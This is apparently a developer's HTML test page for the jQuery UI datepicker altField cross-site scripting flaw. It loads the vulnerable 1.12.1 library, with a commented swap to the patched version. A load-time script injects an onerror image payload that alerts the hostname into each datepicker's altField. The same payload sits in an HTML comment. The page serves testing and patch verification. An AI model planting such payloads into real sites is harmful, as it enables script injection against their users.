<!DOCTYPE html>
<html>
    <head>
        <title>JQuery XSS Tester</title>
        <meta charset="utf-8"> 
        <!-- <link href="jquery-ui-1.12.1/" rel="stylesheet"> -->

        <script src="https://code.jquery.com/jquery-1.10.2.js"></script>

        <!-- Vulnerable JQueryUI version <1.13.0 -->
        <script src="jquery-ui-1.12.1/jquery-ui.js"></script> 
        <!-- Swapout to test new patched JqueryUI version >=1.13.0
        <script src="jquery-ui-1.13.3/jquery-ui.js"></script> -->
    
        <!-- <img onerror='alert(location.hostname)' src='/404' /> -->
        <script>

            console.log("hello");

            var orgDatepicker = $.datepicker;

            //$.datepicker('destroy');

            datepicker =  function ( options ) {
                console.log("called lol")
                return orgDatepicker(options);
                //console.log(options)
            };

            $(function () { 
                $("#gfg").datepicker( { 
                    altField: $("#unt").val(),
                    navigationAsDateFormat: true
                    } 
                ); 
            });

            $(function () { 
                $("#clean").datepicker( 
                    { } 
                ); 
            });

        </script> 
    </head>
    <body>
        <h2>Datepicker XSS tester</h2>

        <h3>jQuery UI | datepicker altField option</h3>
    
        <p>Enter Date: <input type="text" id="gfg"></p>
        
    <!-- --> <P>Enter untrusted alt value: <input type="text" id="unt"></P>
    
        <input type="text" id="field"> 

        <p>second unaffected datepicker: <input type="text" id="clean"> </p>
        
    </body>
    <script>
        //test script

        window.addEventListener("load", function(){

            let elems = document.getElementsByClassName('hasDatepicker');

            console.log(elems);

            const datepickers = [];

            for (elem of elems) {
                console.log(elem);
                
                //sanity check
                try {
                    var dp = window.$.datepicker._getInst(elem);
                } catch (error) {
                    console.log("No associated datepicker object");
                    continue;
                }

                //check if datepicker has altField set/in use
                if ("altField" in dp.settings) {
                    datepickers.push(dp);
                }
            }

        console.log(datepickers);

        // XSS funni moment
        let input = "<img onerror='alert(location.hostname)' src='/404' />";

        for (dp of datepickers) {
            dp.settings.altField = input;
            id = document.getElementById(dp.id);
            //$.datepicker._adjustInstDate(dp, 3, "Y");
            //$.datepicker._updateDatepicker(dp);
            $("#".concat(dp.id)).datepicker( "setDate", "10/12/2012" );
            //$.datepicker._showDatepicker(id);
            //document.getElementById(dp.id).datepicker( "show" );
        }

        });

    </script>
</html>